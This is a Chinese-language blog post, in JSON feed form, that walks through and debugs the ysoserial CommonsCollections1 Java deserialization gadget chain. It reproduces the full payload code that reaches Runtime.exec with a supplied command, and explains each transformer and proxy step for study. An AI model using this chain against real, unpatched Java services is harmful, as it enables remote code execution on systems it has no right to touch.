{
    "version": "https://jsonfeed.org/version/1",
    "title": "Milkii0的秘密花园 • All posts by \"java反序列化\" tag",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/09/07/dmsj/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/",
            "url": "http://example.com/2021/09/07/dmsj/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/",
            "title": "ysoserial之CommonsCollections1调试",
            "date_published": "2021-09-07T02:12:48.000Z",
            "content_html": "<h1 id=\"利用链简述\"><a class=\"markdownIt-Anchor\" href=\"#利用链简述\">#</a> 利用链简述</h1>\n<ol>\n<li>任意方法执行</li>\n<li>高版本 java 已修复（Java 8u71 以后）</li>\n</ol>\n<h1 id=\"commonscollections1利用代码\"><a class=\"markdownIt-Anchor\" href=\"#commonscollections1利用代码\">#</a> CommonsCollections1 利用代码</h1>\n<p>项目地址：<a href=\"https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar\">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\tGadget chain:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tObjectInputStream.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tAnnotationInvocationHandler.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\tMap(Proxy).entrySet()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tAnnotationInvocationHandler.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\tLazyMap.get()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\tChainedTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tConstantTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tClass.getMethod()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.exec()</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tRequires:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tcommons-collections</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@PayloadTest</span> ( precondition = <span class=\"string\">&quot;isApplicableJavaVersion&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CommonsCollections1</span> <span class=\"keyword\">extends</span> <span class=\"title\">PayloadRunner</span> <span class=\"keyword\">implements</span> <span class=\"title\">ObjectPayload</span>&lt;<span class=\"title\">InvocationHandler</span>&gt; </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> InvocationHandler <span class=\"title\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String command)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> String[] execArgs = <span class=\"keyword\">new</span> String[] &#123; command &#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">// inert chain for setup</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">\t\t<span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tString.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tObject.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map innerMap = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tReflections.setFieldValue(transformerChain, <span class=\"string\">&quot;iTransformers&quot;</span>, transformers); <span class=\"comment\">// arm with actual transformer chain</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> handler;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">final</span> String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">\t\tPayloadRunner.run(CommonsCollections1.class, args);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">isApplicableJavaVersion</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"调试分析\"><a class=\"markdownIt-Anchor\" href=\"#调试分析\">#</a> 调试分析</h1>\n<p>ysoserialPOC 类中 getObject 方法一般是获取 payload 的方法</p>\n<h2 id=\"分析paylaod构造\"><a class=\"markdownIt-Anchor\" href=\"#分析paylaod构造\">#</a> 分析 paylaod 构造</h2>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> InvocationHandler <span class=\"title\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String command)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">    \t<span class=\"comment\">// 传入的命令参数存储于execArgs数组中</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> String[] execArgs = <span class=\"keyword\">new</span> String[] &#123; command &#125;;</span><br><span class=\"line\">    \t<span class=\"comment\">// 开始构造transformerChain，用于执行命令</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// inert chain for setup</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 这一步据p神所言是为了隐藏日志中的进程日常信息， 加不加都会执行命令，只是异常信息不同</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">\t\t<span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 通过反射获得Runtime.exec(),并将命令参数execArgs传入</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tString.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tObject.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) </span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 修饰innerMap，将构造的transformerChain传入</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 当LayMap#get被调用时，会执行传入的transformerChain</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map innerMap = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">    \t<span class=\"comment\">// 将lazyMap传入AnnotationInvocationHandler</span></span><br><span class=\"line\">    \t<span class=\"comment\">// java代理sun.reflect.annotation.AnnotationInvocationHandler</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 获得代理对象时，会再传入一个handler（简称handler2），得到代理对象mapProxy，</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class=\"line\">\t\t<span class=\"comment\">// 将该代理对象包裹进入新的handler，简称handler1</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class=\"line\">\t\t<span class=\"comment\">// 最后将构造好的命令执行transformers传入transformerChain</span></span><br><span class=\"line\">    \t<span class=\"comment\">// 最后放是为了防止在构造payload时弹出计算器</span></span><br><span class=\"line\">\t\tReflections.setFieldValue(transformerChain, <span class=\"string\">&quot;iTransformers&quot;</span>, transformers); <span class=\"comment\">// arm with actual transformer chain</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// 最后包装好的handler即为我们的payload</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> handler;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"知识点\"><a class=\"markdownIt-Anchor\" href=\"#知识点\">#</a> 知识点</h3>\n<p>需要理解的知识点主要有两部分：transform 和 proxy</p>\n<p>想要深究的话可以去看详细解释，以下只记录此处用到的点</p>\n<p>我看代理的时候是参考的这篇文章：<a href=\"https://xie.infoq.cn/article/9a9387805a496e1485dc8430f\">https://xie.infoq.cn/article/9a9387805a496e1485dc8430f</a></p>\n<h4 id=\"先来看看trasnform\"><a class=\"markdownIt-Anchor\" href=\"#先来看看trasnform\">#</a> 先来看看 trasnform</h4>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">    <span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\"><span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\"><span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">        String.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">        Object.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">        <span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br></pre></td></tr></table></figure>\n<p><strong>ConstantTransformer</strong></p>\n<p>构造方法传入一个类</p>\n<p>通过该类的 transform 方法获取一个对象类型，如 transform 参数是 Runtime.class 时，调用 ConstantTransformer 类的 transform 方法，执行后返回 java.lang.Runtime 类</p>\n<p><strong>InvokerTransformer</strong></p>\n<p>构造方法 InvokerTransformer (String methodName, Class [] paramTypes, Object [] args)</p>\n<p>第一个参数为方法名，第二个参数为方法参数类型数组，第三个参数为方法参数数组</p>\n<p>该类的 transform 通过反射执行函数</p>\n<p>例如下面的代码，transform 传入 Runtime 对象，通过反射执行 exec 函数，传入命令为 calc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">InvokerTransformer invokerTransformer = <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;,<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;);</span><br><span class=\"line\">invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure>\n<p><strong>transformerChain</strong></p>\n<p>transformers 的链，构造方法传入一个 transform 数组</p>\n<p>串起来了很多 transformer</p>\n<p>为什么是串起来的呢，见下图</p>\n<p><img src=\"62.png\" alt=\"\"></p>\n<p>其中前面一个 transform 输出的结果会作为参数传入后一个 transform</p>\n<p>那么此处代码就可以很好的解释啦</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 通过反射获取Runtime，因为Class类实现了Serializable接口</span></span><br><span class=\"line\"><span class=\"comment\">//        Method f = Runtime.class.getMethod(&quot;getRuntime&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">//        Runtime r = (Runtime) f.invoke(null);</span></span><br><span class=\"line\"><span class=\"comment\">//        r.exec(&quot;C:\\\\WINDOWS\\\\system32\\\\calc.exe&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">    <span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 返回java.lang.Runtime类</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),  </span><br><span class=\"line\">        <span class=\"comment\">//传入上面transform得到的Runtime类（Class对象），调用getMethod方法，传入调用getMethod方法方法参数为getRuntime；也就是获取该类的getRuntime方法</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123; </span><br><span class=\"line\">            String.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">        <span class=\"comment\">// 传入上面transform得到的getRuntime方法（Method对象），调用invoke方法，传入invoke方法的参数为Object[]，其实就是按照参数列表传就好了，因为此处只需要调用invoke方法获得Runtime对象</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">            Object.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">            <span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">        <span class=\"comment\">// 传入上面transform得到的Runtime对象，调用exec方法，传入该方法的参数为execArgs</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">            <span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">        <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"最后康康proxy\"><a class=\"markdownIt-Anchor\" href=\"#最后康康proxy\">#</a> 最后康康 proxy</h4>\n<p>为什么会利用到对象代理呢？</p>\n<p>当然是因为代理的一些些特性辣</p>\n<p>每个代理类有一个公共构造一个参数，该接口的实现 <code>InvocationHandler</code>  ，设置调用处理程序的代理实例</p>\n<p>康康构造方法，会传入一个 InvocationHandler 对象</p>\n<p>并且在调用该代理对象任意方法时，会调用 InvocationHandler#invoke ()</p>\n<p><img src=\"63.png\" alt=\"\"></p>\n<p>但是该方法是 protected 的，很明显我们需要实例化一个代理对象时需要找到另一个可以返回实例的方法</p>\n<p>那就是 newProxyInstance 方法啦</p>\n<p><img src=\"64.png\" alt=\"\"></p>\n<p>来测试试试</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Proxy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * My Test Class</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        TestInvocationHandler handler = <span class=\"keyword\">new</span> TestInvocationHandler();</span><br><span class=\"line\">        Map testProxy = (Map) Proxy.newProxyInstance(Gadgets.class.getClassLoader(), <span class=\"keyword\">new</span> Class[]&#123;Map.class&#125;, handler);</span><br><span class=\"line\">        testProxy.put(<span class=\"string\">&quot;key&quot;</span>,<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestInvocationHandler</span> <span class=\"keyword\">implements</span> <span class=\"title\">InvocationHandler</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">invoke</span><span class=\"params\">(Object proxy, Method method, Object[] args)</span> <span class=\"keyword\">throws</span> Throwable </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;method: &quot;</span> + method.toString());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>debug 代码，可以看见当调用 Map#put 时，会进入 TestInvocationHandler#invoke</p>\n<p><img src=\"65.png\" alt=\"\"></p>\n<p>没戳 proxy 利用到的点就这一个啦</p>\n<h3 id=\"调试\"><a class=\"markdownIt-Anchor\" href=\"#调试\">#</a> 调试</h3>\n<p>比较绕的地方调试一波</p>\n<p><img src=\"36.png\" alt=\"\"></p>\n<p>进入该函数，发现有两处函数计算</p>\n<p><img src=\"37.png\" alt=\"\"></p>\n<p>进入 <code>createMemoizedInvocationHandler(map)</code></p>\n<p>其中 <code>ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</code></p>\n<p>可以看出此处是通过反射获取 AnnotationInvocationHandler 对象，且获取对象时传入了构造的 LazyMap</p>\n<p><img src=\"38.png\" alt=\"\"></p>\n<p>进入 <code>createProxy(handler,iface,ifaces)</code></p>\n<p>对传入的 iface 进行代理，并传入上一步获得的 AnnotationInvocationHandler 对象 handler2</p>\n<p>iface 为传入的 Map.class (CommonsCollections1.java 中： <code>mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</code> ）</p>\n<p><img src=\"39.png\" alt=\"\"></p>\n<p>两次函数执行完毕后，返回 CommonsCollections1</p>\n<p>返回代理对象 mapProxy（调用该对象任意方法，都会先调用传入的 handler#invoke）</p>\n<p>73 行代码将获取到的 mapProxy 进行包裹是因为：</p>\n<p>​\t由于反序列化入口为 readObject，所以我们需要某个类的 readObject 中会调用传入 map 的任意方法</p>\n<p>​\tAnnotationInvocationHandler#readObject 中有调用 map.entrySet ()</p>\n<p>​\t从而触发 AnnotationInvocationHandler#invoke</p>\n<p><img src=\"40.png\" alt=\"\"></p>\n<p>最后返回层层构造好的，还没有序列化的，payload 啦</p>\n<h2 